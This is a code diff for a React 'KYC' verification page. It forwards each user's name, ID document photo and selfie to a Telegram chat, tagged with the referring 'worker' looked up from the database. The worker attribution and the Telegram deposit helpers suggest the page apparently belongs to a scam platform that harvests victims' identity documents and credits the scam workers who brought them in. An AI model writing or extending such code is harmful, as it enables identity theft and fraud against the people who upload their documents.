@@ -8,6 +8,7 @@ import { useLanguage } from '../context/LanguageContext';
 import { sendVerificationToTelegram, canSendDepositToTelegram } from '../lib/telegramNotify';
 import { logAction } from '../lib/appLog';
 import Modal from '../components/Modal';
+import { supabase } from '../lib/supabase';
 
 type KycStep = 'DOC_TYPE' | 'NAME' | 'DOC_PHOTO' | 'SELFIE' | 'SUCCESS';
 
@@ -113,14 +114,38 @@ const KycPage: React.FC<KycPageProps> = ({ onBack }) => {
     setSubmitting(true);
     const docItem = DOC_TYPES.find((d) => d.id === docType);
     const docLabel = docItem ? t(docItem.labelKey) : docType;
+    const workerId = user?.referrer_id ?? null;
+    const escapeHtml = (s: string) =>
+      s
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;');
+
+    let workerLabel = '—';
+    if (workerId != null && workerId > 0) {
+      try {
+        const { data } = await supabase
+          .from('users')
+          .select('full_name, username')
+          .eq('user_id', workerId)
+          .single();
+
+        const row = data as { full_name?: string | null; username?: string | null } | null;
+        workerLabel = (row?.full_name || row?.username || `ID ${workerId}` || '—').trim();
+      } catch {
+        workerLabel = `ID ${workerId}`;
+      }
+    }
+
     const text =
       '🛡 ЗАЯВКА НА ВЕРИФИКАЦИЮ\n\n' +
-      `👤 Пользователь: ${fullName || '—'}\n` +
-      `📄 Документ: ${docLabel}\n` +
+      `👤 Пользователь: ${escapeHtml(fullName || '—')}\n` +
+      `👨‍💼 Воркер: ${escapeHtml(workerLabel)}\n` +
+      `📄 Документ: ${escapeHtml(docLabel)}\n` +
       `🆔 ID: ${user?.user_id ?? tgid ?? '—'}\n` +
       `📅 ${new Date().toLocaleString('ru-RU')}\n\n` +
       '#верификация #kyc';
-    const result = await sendVerificationToTelegram(text, docFile, selfieFile);
+    const result = await sendVerificationToTelegram(text, docFile, selfieFile, { workerLabel });
     setSubmitting(false);
     if (result.ok) {
       setSubmittedOk(true);
